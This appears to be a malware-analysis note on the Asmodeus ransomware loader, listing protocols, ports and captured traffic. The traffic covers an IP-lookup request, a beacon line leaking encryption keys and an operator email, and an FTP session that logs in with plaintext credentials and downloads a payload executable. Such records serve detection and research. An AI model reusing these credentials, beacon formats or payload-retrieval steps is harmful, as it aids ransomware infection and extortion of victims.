# Asmodeus Ransomware Loader

# Links:
https://app.any.run/tasks/2637b905-fa93-4a2a-9fd1-36cd5ac4fb48/

# Protocols:
TCP
FTP
HTTP

# Ports:
162
21

# Sample:

```
GET /ip-provider.php HTTP/1.0
content-length: 0
from: user@sfml-dev.org
host: www.sfml-dev.org
user-agent: libsfml-network/2.x

HTTP/1.1 200 OK
Server: nginx
Date: Tue, 01 Oct 2019 17:17:07 GMT
Content-Type: text/html; charset=UTF-8
Connection: close
X-Powered-By: PHP/7.0.33
Vary: Accept-Encoding
X-Powered-By: PleskLin

185.217.117.157
```

```
IP: 185.217.117.157 ID:9lkzNHBRWnqpvMU Used-Disk:24 Key:$..#GFvA8-I6Op0}a.sG!Q...g.YqJX. Key2:.8N.1...I.3g|*.}.BY...5p3X..Q;(. key3:z5..bl....l;.M.z.....:.F.D.u6SoJ IV:.@V.sn.....qz4.Z IV2:.....8ij.<.....F Mail:Legion.developers72@gmail.com.active.
```

```
220-FileZilla Server 0.9.60 beta
220-written by Tim Kosse (tim.kosse@filezilla-project.org)
220 Please visit https://filezilla-project.org/
USER admin
331 Password required for admin
PASS asmodeusasmodeus
230 Logged on
PWD
257 "/" is current directory.
PASV
227 Entering Passive Mode (80,82,69,52,234,181)
TYPE I
200 Type set to I
RETR uiapp.exe
150 Opening data channel for file download from server of "/uiapp.exe"
226 Successfully transferred "/uiapp.exe"
QUIT
221 Goodbye
```
